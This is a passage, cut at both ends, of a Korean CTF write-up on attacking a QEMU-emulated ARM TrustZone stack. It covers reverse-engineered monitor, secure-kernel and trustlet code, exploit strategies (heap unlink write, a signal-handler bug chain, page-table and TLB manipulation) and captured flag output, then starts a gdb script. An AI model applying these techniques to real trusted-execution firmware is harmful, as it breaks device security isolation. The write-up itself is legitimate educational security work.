부분들은 secure world에서 호출시에만 동작하니 일단 생략한다.\n위 함수가 호출되기 전에 조금 흥미로운 작업을 수행한다.\nsp = 0xe002210 fill out general purpose regs LAB_0000280c XREF[2]: 00002418 (j) , 00002618 (j) 0000280c c0 f9 ff 97 bl FUN_00000f0c undefined FUN_00000f0c(undefined 00002810 e5 03 1f aa mov param_6 ,xzr 00002814 e6 03 00 91 mov param_7 ,sp 00002818 cc 88 40 f9 ldr x12 ,[param_7 , #0x110 ] 0000281c bf 40 00 d5 msr PState.SP,#0x0 00002820 9f 01 00 91 mov sp,x12 00002824 10 40 3e d5 mrs x16 ,spsr_el3 00002828 31 40 3e d5 mrs x17 ,elr_el3 0000282c 12 11 3e d5 mrs x18 ,scr_el3 00002830 d0 c4 11 a9 stp x16 ,x17 ,[param_7 , #0x118 ] ... -- Flow Override: CALL_RETURN (CALL_TERMINATOR) 디컴파일러에선 아예 보이지 않는데, 여기서 normal world context가 저장된 sp를 param_7(w6)에 넣고 spsr_el3, elr_el3, scr_el3를 저장한다.\nPState.SP에 0을 넣고 s-el3의 특정 stack 주소를 세팅해서 동작을 이어간다.\n00000bb4 fd 7b bf a9 stp x29 ,x30 ,[sp, #local_10 ]! 00000bb8 fd 03 00 91 mov x29 ,sp 00000bbc 38 ff ff 97 bl get_secure_mem world_ctx * get_secure_mem(uint6 00000bc0 bf 41 00 d5 msr PState.SP,#0x1 00000bc4 1f 00 00 91 mov sp,x0 00000bc8 bf 40 00 d5 msr PState.SP,#0x0 00000bcc fd 7b c1 a8 ldp x29 ,x30 ,[sp], #0x10 00000bd0 c0 03 5f d6 ret 여기서 sp_elxh를 세팅한다.\n아까 normal world context가 sp_elxh가 가리키는 구조체였고 이전에 normal world context에 접근하나, secure world context에 접근하냐에 따라 S-EL3에 진입할 때 어떤 world context에 저장할지 결정된다.\n00000fa8 f1 03 00 91 mov x17 ,sp 00000fac bf 41 00 d5 msr PState.SP,#0x1 00000fb0 f1 8b 00 f9 str x17 ,[sp, #param_11 ] 00000fb4 f2 83 40 f9 ldr x18 ,[sp, #SCR_EL3 ] 00000fb8 f0 c7 51 a9 ldp x16 ,x17 ,[sp, #SPSR_EL3 ] 00000fbc 12 11 1e d5 msr scr_el3 ,x18 00000fc0 10 40 1e d5 msr spsr_el3 ,x16 00000fc4 31 40 1e d5 msr elr_el3 ,x17 00000fc8 f5 ff ff 17 b FUN_00000f9c undefined FUN_00000f9c(undefined -- Flow Override: CALL_RETURN (CALL_TERMINATOR) 그리고 마지막으로 여기서 world switch를 수행한다.\nFUN_00000f9c에선 general purpose register 불러오고 eret을 수행한다.\n아무리 봐도 악용할만한 취약점이 보이지 않았다.\n그래서 S-EL0 부터 공격하기로 결정했다.\nAnalyzing the Interaction Between the Normal World and the Secure World EL0 iVar1 = tc_init_trustlet(iVar1,size); if (iVar1 == 0) { pTVar3 = (TCI *)mmap((void *)0x0,0x1000,3,0,0,-1); uVar2 = tc_register_wsm(pTVar3,0x1000); ... 위와 같은 방식으로 초기화를 했었고 TA_bin이라는 이상한 바이너리를 넘겼었다.\nEL1 따로 처리 로직이 존재한다.\nif (x8 == 0xff000005) { if ((x0 \u0026 0xfff) == 0) { uVar1 = secure_monitor_call(0x83000005,x0 \u0026 0xffffffff,x1 \u0026 0xffffffff,0); ... else if (x8 == 0xff000006) { if ((x0 \u0026 0xfff) == 0) { uVar1 = secure_monitor_call(0x83000006,x0,0,0); 실질적으로 약간의 넘겨진 메모리 주소 검사를 해주고 모두 secure monitor로 넘긴다.\nEL2 if (x1 \u003c 0x3c001) { x0 = SMC_handler(0x83000003,x1 + 0x40000000); ... else { x0 = SMC_handler(x0,x1); ... IPA → PA를 해주고 Secure monitor로 마저 넘긴다.\nS-EL3 ... if ((non_secure \u0026 1) == 0) { if (x0 != 0x83000002) { if (x0 == 0x83000007) { save_el1_sysregs(0); pwVar2 = get_secure_mem(1); restore_sysregs(1); set_spelx(1); pwVar2-\u003ex0 = x1; return pwVar2; } FUN_00000d28(); do_panic(); ... } else { uVar1 = uVar1 \u0026 0xffffffff; /* save non-secure system register */ save_el1_sysregs(1); if (x0 == 0x83000001) { ... FUN_00000b2c(0,tmp.PC + 0x20,0x1d3); restore_sysregs(0); set_spelx(0); ... } 이제 호출되었을 때 어디로 가는지 확인해야할 필요가 있다.\nSPSR_EL3 structure \u0026 gdbscript AArch64 exception이 발생했을 때 M bit 인코딩과 arm32에 대한 M bit 인코딩을 메뉴얼에서 확인했고 명령어 지원을 추가했다.\nbootloader S-EL1을 보다가 못 읽겠어서 aarch32 manual을 찾아서 차근차근 읽어봤다.\n그랬더니 이미 정의된 주소로 핸들링을 수행한다고 한다.\nSecure VBAR을 확인해야한다.\naarch64와 다르게 시스템 레지스터에 접근한다.\n읽는 법은 위처럼 읽으면 된다.\nVBAR 인자가 뭔지 잘 모르겠다.\n그래서 부트로더로 다시 돌아가서 secure world가 어떻게 초기화되는지 분석했다.\nkernel의 첫 페이지는 IPA 0x0에 매핑되어있다.\n그래서 실질적으로 rebase해서 EL1을 분석할 때는 초기 페이지들을 날리고 했어야했다.\n어쨋든 FUN_ffffffffc0008210에서 TEE OS initialize를 한다.\n... normal_ctx._536_4_ = 1; FUN_00000120(0xe000000,1,DAT_0e000008,0xe400000,1,2,(uVar2 \u0026 0xffffffff) * 0x220 + 0xe002430); } return !bVar1; } 0xe000000가 보이는거 보니 boot argument 같은 것으로 보인다.\nBL1에서 0x68 만큼 copy한 데이터에 속한다.\n... (secure_context-\u003esysregs).SCTLR_EL1 = (ulong)((*(uint *)(param_2 + 4) \u0026 2) \u003c\u003c 0x18 | uVar1); lVar2 = actlr_el1; (secure_context-\u003esysregs).ACTLR_EL1 = lVar2; if (ns == 0) { (secure_context-\u003esysregs).PMCR_EL0 = 0x60; } /* SCR_EL3.NS = 0 */ secure_context-\u003escr_el3 = (ulong)new_SCR; secure_context-\u003epc = *(uint64_t *)(param_2 + 8); secure_context-\u003espsr = (ulong)*(uint *)(param_2 + 0x10); ... 위와 같이 secure context를 세팅한다.\nvoid FUN_000001f8(long param_1) { restore_sysregs(0); set_spelx(0); FUN_00000c90(param_1 + 0x10); return; } FUN_00000c90 내부적으로 시스템 레지스터 세팅하고 eret한다.\n어떤식으로 world switch가 일어나고 어디를 분석해야할지 알게 되었다.\nSecure world pagewalk gdbscript qemu에서 system registers를 보여주는데 오류가 있어서 직접 pagewalk를 하는 명령어 지원을 추가했다.\n메뉴얼은 적당히 보고 넘기면서 구현했다.\nAP[2:1] 모델이 조금 달라서 그부분도 신경쓰면서 구현했다.\n... lvl1_idx = addr \u003e\u003e 21 \u0026 0x7f; if ((*(uint *)(\u0026trans_table_lvl1 + lvl1_idx * 8) | *(uint *)(lvl1_idx * 8 + 0x8004004)) == 0) { uVar1 = FUN_0800019c(\u0026trans_table_lvl2 + lvl1_idx * 0x1000); *(uint *)(\u0026trans_table_lvl1 + lvl1_idx * 8) = uVar1 | 3; FUN_08001944(\u0026trans_table_lvl2 + lvl1_idx * 0x1000,0,0x1000); } iVar2 = ((addr \u003e\u003e 0xc \u0026 0x1ff) + lvl1_idx * 0x200) * 8; *(uint *)(\u0026trans_table_lvl2 + iVar2) = local_30 | phys_addr; *(uint *)(iVar2 + 0x8005004) = uStack_2c; ... 읽었던 메뉴얼이랑 세부 사항이 다른 것같아서 리버싱한 결과대로 구현했다.\n빠르게 구현하는데 초점을 맞춰서 구현이 제대로 되었는지는 잘 모르겠다.\n기존에 미리 작성했던 secure world의 물리 메모리를 읽는 스크립트를 같이 활용해서 구현했다.\nException vector tables를 포함한 text 부분이 PL1에서도 Read-Only 인 것을 보니 구현이 틀리지는 않았을 것 같다.\nReverse engineering S-EL1 VBAR은 0xe400000 이다.\n... coprocessor_moveto2(0xf,0,DAT_00001798 + (0x16a0 - DAT_000017a8),0,in_cr2); coprocessor_moveto2(0xf,1,0,0,in_cr2); coprocessor_moveto(0xf,0,0,0xff440400,in_cr10,in_cr2); coproc_moveto_Translation_table_control(0x80802504); coproc_moveto_Domain_Access_Control(DAT_000017ac); ... 이런 괴랄한 코드는 어떻게 읽는지 모르겠어서 메뉴얼을 다시 읽었다.\nmcrr은 register 두 개를 쓰는거라 64-bit 시스템 레지스터에 쓴다고 한다.\n이런식의 인코딩 차이가 있다.\n드디어 CRm만 가지고 어떻게 표를 보는지 알게 되었다.\nbios.bin을 FEFFFFEA로 패치해서 무한루프를 만들어서 원하는 곳을 디버깅할 수 있다.\nNormal world에 대한 디버깅 능력을 상실했으니 무조건 secure world에서 멈춰야한다.\n디버거가 시스템 레지스터를 제대로 표현하지 못한다.\n... /* TTBR0 */ coprocessor_moveto2(0xf,0,DAT_0e401798 + (0xe4016a0 - DAT_0e4017a8),0,in_cr2); /* TTBR1 */ coprocessor_moveto2(0xf,1,0,0,in_cr2); coprocessor_moveto(0xf,0,0,0xff440400,in_cr10,in_cr2); /* TTBCR */ coproc_moveto_Translation_table_control(0x80802504); /* DACR */ coproc_moveto_Domain_Access_Control(DAT_0e4017ac); /* VBAR */ coprocessor_moveto(0xf,0,0,LONG_0e4017b0,in_cr12,in_cr0); uVar1 = coproc_movefrom_Control(); /* enable mmu */ coproc_moveto_Control(uVar1 | 1); ... 천천히 보니 어떤 행동을 하고 있는지 알 것 같다.\n생각보다 변환 단계가 그리 많지 않아서 직접 손으로 해도 충분하다.\nVBAR는 VA 0x8000040 이지만, PA로 변환해보면 0xe400040이다.\ncps로 다시 supervisor mode로 변경해서 마저 TEE os initialization을 수행한다.\n이후 다시 VBAR을 정상적으로 세팅해준다.\n0e401754 10 0f 01 ee mcr p15,0x0 ,r0,cr1 ,cr0 ,0x0 0e401758 58 d0 9f e5 ldr sp,[DAT_0e4017b8 ] = 08087000h 0e40175c 3f fa ff fa blx FUN_0e400060 undefined FUN_0e400060() 0e401760 13 00 02 f1 cps #19 0e401764 50 d0 9f e5 ldr sp,[DAT_0e4017bc ] = 08085000h 0e401768 50 00 9f e5 ldr r0,[DAT_0e4017c0 ] = 10000000h thumb로 모드를 변경한다.\n08001780 3c 10 9f e5 ldr r1,[DAT_080017c4 ] = 08000000h 08001784 02 00 00 e3 movw r0,#0x2 08001788 00 03 48 e3 movt r0,#0x8300 0800178c 70 00 60 e1 smc 0x0 그리고 다시 smc를 불러서 secure monitor로 돌아간다.\n의사코드만 읽다가 위 어셈블리 스니펫을 놓쳤었는데, 이거 때문에 하루종일 삽질했다.\n다시 secure monitor로 돌아가면 r1을 저장하며, TEE OS initialized 문구를 출력한다\nEL0에서 TA_Bin을 secure world로 업로드했었는데, 거기를 처리하는 로직을 찾아야한다.\nsecure monitor 분석 결과를 기반으로 처리 로직은 vector_table + 0x20 를 따라가면 나온다는 것을알고 있다.\nentry 부터 쭉 따라가다 보면 바로 원하는 로직을 발견할 수 있다.\n여기서 업로드 로직을 확인해야 secure world에서 동작하는 user binary가 어떻게 동작하는지 알 수 있다.\nReversing the binary loader \u0026 S-EL0 binary extraction 이후 커스텀 로더를 분석했고 바이너리 포맷을 알아냈다.\nnon-secure world에서 전달된 바이너리의 무결성은 sha256으로 검증된다.\n0x1000 0x1000 (0x684) 0x2000 0x1000 (0xa8) 0x100000 0x82000 (0x81070) 0xff8000 0x8000 (0x8000) 위와 같이 매핑된다.\n권한은 직접 만든 secure world에서의 pagewalk 명령어로 확인할 수 있었다.\n0x24만큼 헤더가 짤린 S-EL0.bin을 기드라에 로드해서 세그먼트 별로 잘라서 로드해주고 분석하면 된다.\nS-EL0, Secure application ... interrupt_kernel(0xb,0x1001); if (tci_handle_arg-\u003ecmd == 2) { /* load */ FUN_0000104e(tci_handle_arg); } else if (tci_handle_arg-\u003ecmd == 3) { /* store */ FUN_000010f6(tci_handle_arg); } ... 내부적으로 store 로직에서 custom heap allocator를 이용한다.\nVulnerability uint32_t * malloc(uint sz) { ... if ((int)is_heap_initialized \u003c 0) { FUN_000012c2(); } cur_chunk = Arena.chunk_ptr; /* size normalization */ if (sz + 0x1f \u003c 0x20) { size = 0x20; } else { size = sz + 0x1f \u0026 0xfffffff0; } if (size \u003c 0x40000) { for (iter_chunk = (Arena.freelist)-\u003efd; iter_chunk != Arena.freelist; iter_chunk = iter_chunk-\u003efd) { FD = iter_chunk-\u003efd; BK = (freed_chunk *)iter_chunk-\u003ebk; cur_sz = iter_chunk-\u003esize \u0026 0xfffffffc; if (size \u003c= cur_sz) { BK-\u003efd = FD; FD-\u003ebk = (uint32_t)BK; *(uint *)((int)\u0026iter_chunk-\u003esize + cur_sz) = *(uint *)((int)\u0026iter_chunk-\u003esize + cur_sz) | 1; /* prev inuse bit set */ return \u0026iter_chunk-\u003ebk; } } cur_sz = (Arena.chunk_ptr)-\u003esz \u0026 0xfffffffc; if (size + 0x20 \u003c= cur_sz) { next_chunk = (chunk *)((int)\u0026(Arena.chunk_ptr)-\u003efd_const0 + size); cur_sz_addr = \u0026(Arena.chunk_ptr)-\u003esz; Arena.chunk_ptr = next_chunk; *cur_sz_addr = size | 1; next_chunk-\u003esz = cur_sz - size | 1; return \u0026cur_chunk-\u003epayload; } } else { size = size + 0xfff \u0026 0xfffff000; iVar1 = (chunk *)software_interrupt_2(0,size,0,0,0xffffffff,0); if (iVar1 != (chunk *)0xffffffff) { iVar1-\u003esz = size | 2; return \u0026iVar1-\u003epayload; } } /* unlink */ return (uint32_t *)0x0; } 구조체를 복원하고 분석하다가 integer overflow를 발견했다.\n취약점을 트리거하면 size가 너무 커지기에 무조건 SIGSEGV가 난다.\n이후 abort exception handler로 진입한다.\nvoid FUN_00001000(undefined4 param_1) { ... auStack_1c[0] = (undefined2)s_Secure_DB_access_failed_(SIGSEGV_00002000._32_4_; pTStack_18 = tci_handle; tci_handle-\u003ecmd = 1; uStack_44 = param_1; strcpy(pTVar1-\u003edata,\u0026uStack_3c); uVar3 = 0x104f; puVar2 = (undefined4 *)FUN_0000166c(0); pcStack_54 = s_Secure_DB_access_failed_(SIGSEGV_00002000 + 0x20; ... 다시 원래 context로 복원하여 계속 실행되게 된다.\nsecure world에서의 pagewalk 결과를 보면, 매핑 자체가 PL0에서 RWX 임을 알 수 있다.\n다음과 같은 malloc 내부 로직을 이용하여 4 bytes aaw를 달성한다.\n... FD = iter_chunk-\u003efd; BK = (freed_chunk *)iter_chunk-\u003ebk; cur_sz = iter_chunk-\u003esize \u0026 0xfffffffc; if (size \u003c= cur_sz) { BK-\u003efd = FD; FD-\u003ebk = (uint32_t)BK; *(uint *)((int)\u0026iter_chunk-\u003esize + cur_sz) = *(uint *)((int)\u0026iter_chunk-\u003esize + cur_sz) | 1; /* prev inuse bit set */ return \u0026iter_chunk-\u003ebk; ... Arena.chunk_ptr을 변조하면 S-EL0의 code segment에 대한 청크 할당이 가능해진다.\n이를 이용해 S-EL0의 엔트리를 변조해서 임의 쉘코드 실행을 달성한다.\n내부적으로 이미 할당된 청크에 대해서는 free이후 다시 할당해서 reclaim이 가능하다.\nfreelist에 역순으로 size 더 크게해서 chunk free하고 취약점을 트리거해서 메타데이터를 덮었다.\n이후 Arena 구조체의 entry를 4 bytes aaw primitive를 이용해 덮고, freelist에 적합한 size를 초과한 크기를 할당하면 원하는 S-EL0의 .text 영역에 read/write가 가능해진다.\nexploit 전략은 다음과 같다.\nchunk 2 1 0 free. chunk 0 reclaim → heap overflow. chunk 1 할당, 0x100050 fd,bk 작성해서 freelist 순회 끊키 → unlink aaw Arena.chunk_ptr overwrite → .text. size를 0x300 정도로 설정해서 next chunk에 write 연산 sigsegv 방지, 돌고 있는 memcpy 코드 수정 방지 \u0026 할당된 청크에 쉘 코드 작성. 시스템 레지스터를 읽고 world shared memory에 flag write하고 software interrupt 0를 발생시켜 normal world로 복귀해서 플래그 출력.\n취약점 자체는 간단해서 금방 찾았는데 malloc 내부 로직에서 자꾸 꼬여서 익스가 힘들었다. [*] Paused (press any to continue) [*] Switching to interactive mode hitcon{this is flag 3 for EL2} \\x00hitcon{this is flag 4 for S-EL0}[*] Got EOF while reading in interactive S-EL1, Secure kernel 이제 S-EL1에서 Secure world의 물리 메모리까지 마음대로 수정할 수 있으면 S-EL3를 공격할 수 있다.\n실질적으로 Secure world는 EL0\u00261 regime가 singe VA range 방식을 취하고 있기에 좀 더 구조적으로 취약하다.\nS-EL1 자체는 S-EL0 뿐만 아니라 EL2에서도 간접적으로 상호 작용이 가능해 공격 벡터가 될 수 있다.\nVulnerability 1 - Permission bug Secure physical address에 대한 접근은 제한된다.\n그런데 약간의 문제가 발생할 여지가 있다.\n권한 설정에 문제가 있다.\n... uVar2 = va \u003e\u003e 0x15 \u0026 0x7f; uVar3 = va \u003e\u003e 0xc \u0026 0x1ff; iVar1 = uVar2 * 8; if ((*(uint *)(\u0026trans_table_lvl1 + iVar1) | *(uint *)(iVar1 + 0x8004004)) == 0) { local_c = (uVar3 + 1) * 0x1000; } else { iVar1 = (uVar3 + uVar2 * 0x200) * 8; if ((*(uint *)(\u0026trans_table_lvl2 + iVar1) | *(uint *)(iVar1 + 0x8005004)) != 0) { ... trans_table_lvl2에 0x200 * 8 을 더해서 접근하는 이유는 lvl2 page table이 연속적이기 때문이었다.\nundefined4 FUN_080003da(int param_1,int phys,int sz,undefined4 prop) { int iVar1; int size; int phys_addr; int VA; size = sz; phys_addr = phys; VA = param_1; while( true ) { if (size == 0) { return 0; } iVar1 = FUN_080001e8(VA,phys_addr,prop); if (iVar1 == -1) break; VA = VA + 0x1000; phys_addr = phys_addr + 0x1000; size = size + -0x1000; } return 0xffffffff; } 분석한 결과를 토대로 FUN_0800054a은 그냥 할당되지 않은 VA를 리턴하는 함수라는 것을 알 수 있다.\nFUN_080003da은 컨트롤 불가능한 Secure VA와 Non-secure PA와 size, 고정된 attribute 값을 인자로 받는다.\n+static const MemMapEntry memmap[] = { + /* Space up to 0x8000000 is reserved for a boot ROM */ + [VIRT_FLASH] = { 0, 0x08000000 }, + [VIRT_CPUPERIPHS] = { 0x08000000, 0x00020000 }, + [VIRT_UART] = { 0x09000000, 0x00001000 }, + [VIRT_SECURE_MEM] = { 0x0e000000, 0x01000000 }, + [VIRT_MEM] = { 0x40000000, RAMLIMIT_BYTES }, +}; integer overflow 버그가 존재하지만 취약점으로 0x0 번지를 할당받아도 최대 사이즈 검증 때문에 절대 FLASH 영역을 벗어날 수 없어 의미가 없다.\nwrite를 하더라도 qemu 에뮬레이터는 실제 환경과 동일하게 FLASH의 read only를 보장한다.\n악용할 수 없는 취약점이다.\nundefined4 FUN_080001e8(uint addr,uint phys_addr,uint param_3) { ... uVar3 = addr \u003e\u003e 0x15 \u0026 0x7f; if ((*(uint *)(\u0026trans_table_lvl1 + uVar3 * 8) | *(uint *)(uVar3 * 8 + 0x8004004)) == 0) { uVar1 = FUN_0800019c(\u0026trans_table_lvl2 + uVar3 * 0x1000); *(uint *)(\u0026trans_table_lvl1 + uVar3 * 8) = uVar1 | 3; FUN_08001944(\u0026trans_table_lvl2 + uVar3 * 0x1000,0,0x1000); } iVar2 = ((addr \u003e\u003e 0xc \u0026 0x1ff) + uVar3 * 0x200) * 8; *(uint *)(\u0026trans_table_lvl2 + iVar2) = local_30 | phys_addr; *(uint *)(iVar2 + 0x8005004) = uStack_2c; ... 내부적으로 walk해서 다음과 같이 할당한다.\n이때 넘어가는 물리 주소는 비트맵을 통해 관리되며 할당 해제된 상태에선 1로 마스킹된다.\nvoid FUN_080006ba(int phys) { ... uVar1 = phys - secure_phys_max \u003e\u003e 17; if (uVar1 \u003c 0x20) { v0[uVar1] = v0[uVar1] | 1 \u003c\u003c (0x1f - (phys - secure_phys_max \u003e\u003e 12 \u0026 0b00011111) \u0026 0xff); } return; } 2 진수로 보면 편한데, 내부적으로 Secure VA를 PA로 변환하고 0을 대입한다.\n그리고 size 만큼 루프돌면서 위 함수를 호출하는데, 이는 v0에 일종의 bitmap 방식으로 freed memory를 마킹한다.\nVulnerability 2 - file upload DOS ... iVar1 = verify(param_1,param_2); ... FUN_08001944(*(undefined4 *)(param_1 + 0x14),0,iVar1); FUN_08001906(*(undefined4 *)(param_1 + 0x14),param_1 + iVar4 + 0x24, *(undefined4 *)(param_1 + 0x18)); } if (*(int *)(param_1 + 0x20) != 0) { FUN_08001944(*(undefined4 *)(param_1 + 0x1c),0,iVar2); } FUN_08001944(0xff8000,0,0x8000); Entry = *(dword *)(param_1 + 8); tci_handle = (TCI **)(*(int *)(param_1 + 0x20) + *(int *)(param_1 + 0x1c) + -4); ... 업로드 코드의 일부이다.\n다른 world이고 translation 방식도 다른데 secure world의 VA를 넘기는게 이상했다.\n유효하지 않은 주소를 보내면 DOS가 가능하다.\nsystem call interface도 공격 벡터가 될 수 있으니 다음 software interrupt handler를 분석해야한다.\nvoid FUN_08000a30(void) { ... switch(from_text) { case 0: FUN_08000918(ctx.r0); break; case 1: local_10 = FUN_08000928(ctx.r0,ctx.r1); break; case 2: local_10 = FUN_08000964(ctx.r0,ctx.r1); break; case 3: local_10 = FUN_080009d6(ctx.r0,ctx.r1); } ctx.r0 = local_10; return; case 0은 normal world로 복귀할 때 이용한다.\nS-EL3에선 ctx.x0에 여기서 Secure application에서 넘긴 리턴 값을 Normal world로 옮긴다.\ncase 1은 signal handler를 할당한다.\nVulnerability 3 - signal handler undefined4 FUN_08000928(int r0,uint r1) { if ((r1 \u003c 0x2400000) \u0026\u0026 (r0 == 0xb)) { _signal_handler = r1; } return 0xffffffff; } 이때 검증이 없어 world shared memory도 signal handler 등록이 가능하다.\nFUN_08000964는 이용가능한 VA에 물리 주소를 매핑한다.\ncase 2, 3은 메모리 매핑 및 언매핑 함수다.\n공통적으로 다음 로직이 구현된다.\nint FUN_080005ac(void) { int iter; int local_c; local_c = -1; iter = 0; while ((iter \u003c 0x20 \u0026\u0026 (local_c = FUN_080005a2(v0[iter]), local_c == 32))) { iter = iter + 1; } if (local_c == 0x20) { local_c = -1; } else { v0[iter] = v0[iter] \u0026 ~(1 \u003c\u003c (0x1fU - local_c \u0026 0xff)); local_c = local_c + iter * 32; } return local_c; } Secure VA를 페이지 테이블에서 제거할 때 right shift 17을 했었다.\n그냥 비트맵을 확인하고 물리메모리가 비었으면 그 부분을 리턴한다.\n2^12랑 곱하면 특정 비트에 해당하는 주소를 계산할 수 있다는 것을 알 수 있다.\nint FUN_08000684(void) { int iVar1; iVar1 = FUN_080005ac(); if (iVar1 == -1) { iVar1 = -1; } else { iVar1 = iVar1 * 0x1000 + secure_phys_max; } return iVar1; } Secure physical memory에 더해가면서 할당한다.\nS-EL1과 S-EL0는 Abort가 발생하면 똑같은 exception handler로 진입한다.\n08001588 3c e0 8d e5 str lr,[sp,#param_11 ] 0800158c 00 e0 4f e1 mrs lr,spsr 08001590 40 e0 8d e5 str lr,[sp,#param_12 ] 08001594 13 00 02 f1 cps #19 08001598 8a 00 00 eb bl FUN_080017c8 undefined FUN_080017c8(undefined 0800159c 44 80 9d e5 ldr r8,[sp,#param_13 ] 080015a0 1f 00 02 f1 cps #31 080015a4 08 d0 a0 e1 cpy sp,r8 080015a8 17 00 a0 e3 mov param_1 ,#0x17 080015ac 6b fd ff fb blx FUN_08000b62 undefined FUN_08000b62() 080015b0 b1 00 00 ea b FUN_0800187c undefined FUN_0800187c(undefined -- Flow Override: CALL_RETURN (CALL_TERMINATOR) spsr은 exception 발생시에 mode를 가리킨다.\nvoid FUN_08000ae0(void) { if ((_signal_handler \u0026 1) == 0) { ctx.cpsr = ctx.cpsr \u0026 0b11111111111111111111111111011111; } else { ctx.cpsr = ctx.cpsr | 0b00100000; } ctx.pc = _signal_handler; ctx.r0._0_1_ = 0xb; ctx.r0._1_1_ = 0; ctx.r0._2_1_ = 0; ctx.r0._3_1_ = 0; return; } 구조체를 복원했다.\nLAB_08001870 XREF[1]: FUN_0800187c:08001888 (j) 08001870 e8 ff ff eb bl FUN_08001818 undefined FUN_08001818(undefined 08001874 3c e0 9d e5 ldr lr,[sp,#0x3c ] 08001878 0e f0 b0 e1 movs pc,lr movs pc, lr로 핸들러로 돌아간다.\n이때 spsr에 대한 mode 체크가 없다는 취약점이 있다.\n이 취약점을 악용하기 위해선 S-EL1에서 Access violation 관련 exception을 일으켜야 한다.\nGaining code execution 총 세 가지 취약점을 체이닝하면 임의 코드 실행을 얻을 수 있다.\nWorld shared memory mapping에 이용되는 메모리 권한 취약점. Signal exception handler 구현 취약점. Secure world user application upload에서 발생하는 DOS 취약점. Enhancing the exploitation stability 먼저 S-EL3까지 exploit 하기 위해선 shellcode를 넣을 공간이 필요했다.\n기존 익스플로잇은 0x300 크기라서 그 이상가면 런타임에 memcpy가 덮히게 되고, qemu 3.0.0의 버그로 인해 디버깅이 아예 불가능하게 된다.\n그래서 디버깅시엔 코드가 실행이 안되고, bp를 설정하지 않으면 코드가 실행이 된다.\n결론적으로 불안정한 코드로 인해 발생한 버그라서 memcpy 보다 상위에 있는 코드 스니펫을 덮으려 시도했고, 성공적으로 덮었다.\n[*] Switching to interactive mode hitcon{this is flag 3 for EL2} \\x00hitcon{this is flag 5 for S-EL1}[*] Got EOF while reading in interactive $ [*] Interrupted Exploit 시나리오 자체는 전과 비슷하다.\n똑같이 secure에서 flag를 가져오고, 다시 Normal world로 복귀해서 flag를 출력한다.\nS-EL3, Secure monitor 00000fa8 f1 03 00 91 mov x17 ,sp 00000fac bf 41 00 d5 msr PState.SP,#0x1 00000fb0 f1 8b 00 f9 str x17 ,[sp, #param_11 ] 00000fb4 f2 83 40 f9 ldr x18 ,[sp, #SCR_EL3 ] 00000fb8 f0 c7 51 a9 ldp x16 ,x17 ,[sp, #SPSR_EL3 ] 00000fbc 12 11 1e d5 msr scr_el3 ,x18 00000fc0 10 40 1e d5 msr spsr_el3 ,x16 00000fc4 31 40 1e d5 msr elr_el3 ,x17 00000fc8 f5 ff ff 17 b FUN_00000f9c undefined FUN_00000f9c(undefined -- Flow Override: CALL_RETURN (CALL_TERMINATOR) 전에 분석했을 때는 전혀 취약점이 보이지 않았었다.\n나중에 다시 보니 쉽게 구조적인 취약점을 발견할 수 있었다.\n취약점 상세 내용은 다음과 같다.\nVulnerability S-EL3의 일부 rw가 필요한 영역은 RAM에 적재된다.\n그런데 context switching 시에 보호해야 할 시스템 레지스터들이 RAM에 올라와있다.\n이런 구조는 절대 격리가 유지될 수 있는 구조가 아니다.\n이미 ram에 대한 모든 제어권을 가지고 있기에 그냥 바꾸기만 하면 된다.\n생각해낸 익스플로잇 시나리오는 다음과 같다.\nS-EL1 PTE 조작 → 쉘 코드 작성. S-EL1 PTE 조작 → S-EL3 PTE 조작 → 쉘 코드 페이지 매핑. S-EL1 PTE 조작 \u0026 tlb flush → ctx.pc, ctx.cpsr 변조. Secure monitor call → ACE.\n여기서 세 번째 스텝이 tlb flush 인데 이건 같은 VA를 다른 PA에 매핑하기 위해 연속적으로 같은 VA에 접근해서 tlb가 캐싱되므로 이를 flush 하기 위해서 이용했다.\nqemu는 mmu를 프로세서와 완전 동일하게는 아니여도 범용적인 mmu를 softmmu라는 feature로 mmu 에뮬레이션을 지원하기에 꼭 필요한 스텝이다. static bool mmu_lookup1(CPUState *cpu, MMULookupPageData *data, int mmu_idx, MMUAccessType access_type, uintptr_t ra) { vaddr addr = data-\u003eaddr; uintptr_t index = tlb_index(cpu, mmu_idx, addr); CPUTLBEntry *entry = tlb_entry(cpu, mmu_idx, addr); uint64_t tlb_addr = tlb_read_idx(entry, access_type); bool maybe_resized = false; CPUTLBEntryFull *full; int flags; /* If the TLB entry is for a different page, reload and try again. */ if (!tlb_hit(tlb_addr, addr)) { if (!victim_tlb_hit(cpu, mmu_idx, index, access_type, addr \u0026 TARGET_PAGE_MASK)) { tlb_fill(cpu, addr, data-\u003esize, access_type, mmu_idx, ra); maybe_resized = true; index = tlb_index(cpu, mmu_idx, addr); entry = tlb_entry(cpu, mmu_idx, addr); } tlb_addr = tlb_read_idx(entry, access_type) \u0026 ~TLB_INVALID_MASK; } full = \u0026cpu-\u003eneg.tlb.d[mmu_idx].fulltlb[index]; flags = tlb_addr \u0026 (TLB_FLAGS_MASK \u0026 ~TLB_FORCE_SLOW); flags |= full-\u003eslow_flags[access_type]; data-\u003efull = full; data-\u003eflags = flags; /* Compute haddr speculatively; depending on flags it might be invalid. */ data-\u003ehaddr = (void *)((uintptr_t)addr + entry-\u003eaddend); return maybe_resized; } mmu_lookup1 함수에서 hit이면 그냥 저장된 인덱스에 맞춰서 바로 리턴하는 것을 확인할 수 있다.\n쉘 코드 길이를 늘리기 위해선 그냥 여기서 fault 내고 더 낮은 exception vector offset으로 뛰면 0xd00 주변으로 뛸 수 있다.\n그걸 이용해서 0xd00 주변에 쉘 코드를 배치한다.\n\\x00hitcon{this is flag 6 for EL3} \\x00hitcon{this is flag 6 for EL3} \\x00hitcon{this is flag 6 for EL3} \\x00$ [*] Interrupted hitcon{this is flag 6 for EL3} Appendix Gdbscript import gdb import re import psutil import struct class CPSR(gdb.Command): def __init__(self): super(CPSR, self).__init__(\"cpsr\", gdb.COMMAND_USER) def invoke(self, arg, from_tty): cpsr = (int(gdb.parse_and_eval(\"$cpsr\"))) mode = cpsr \u0026 0b1111 is_thumb = (cpsr \u003e\u003e 4)\u00261 state = (cpsr \u003e\u003e 4)\u00261 IRQ = (cpsr \u003e\u003e 5)\u00261 FIQ = (cpsr \u003e\u003e 6)\u00261 cond = (cpsr \u003e\u003e 27)\u00260b1111 re = '' if not state: if 0b0000 == mode: re += 'EL0t' # SP_EL0 elif 0b0100 == mode: re += 'EL1t' # SP_EL0 elif 0b0101 == mode: re += 'EL1h' # SP_EL1 elif 0b1000 == mode: re += 'EL2t' # SP_EL0 elif 0b1001 == mode: re += 'EL2h' # SP_EL2 elif 0b1100 == mode: re += 'EL3t' # SP_EL0 elif 0b1101 == mode: re += 